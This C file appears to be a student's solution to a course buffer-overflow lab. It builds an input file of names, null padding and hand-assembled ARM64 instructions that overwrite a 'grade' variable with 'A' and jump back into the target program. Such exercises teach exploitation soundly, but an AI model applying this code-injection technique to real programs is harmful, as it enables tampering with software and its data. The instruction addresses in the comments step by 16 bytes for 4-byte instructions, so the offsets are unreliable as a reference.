#include <stdio.h>
#include <string.h>
#include "miniassembler.h"

int main (void) {
    FILE *psFile;
    char* partners = "Connor & Laura";
    int i;
    unsigned int uiMovCmd;
    unsigned int uiAdrCmd;
    unsigned int uiStrbCmd;
    unsigned int uiBCmd;

    psFile = fopen("dataA", "w");

    fprintf(psFile, "%s", partners);

    for (i = 0; i < 18; i++) {
        fprintf(psFile, "%c", '\0');
    }

    /* 0x4200D8      | movw0, 'A' */
    uiMovCmd = MiniAssembler_mov(0x00, 0x41);
    fwrite(&uiMovCmd, sizeof(unsigned int), 1, psFile);

    /* 0x4200E8      |adr x1, grade */
    uiAdrCmd = MiniAssembler_adr(0x01, 0x4200E8, 0x420044);
    fwrite(&uiAdrCmd, sizeof(unsigned int), 1, psFile);

    /* 0x4200F8      |strb w0, [x1] */
    uiStrbCmd = MiniAssembler_strb(0x00, 0x01);
    fwrite(&uiStrbCmd, sizeof(unsigned int), 1, psFile);

    /* 0x420108      | b 0x40089c  */
    uiBCmd = MiniAssembler_b(0x40089c, 0x420108);
    fwrite(&uiBCmd, sizeof(unsigned int), 1, psFile);

    return 0;
}
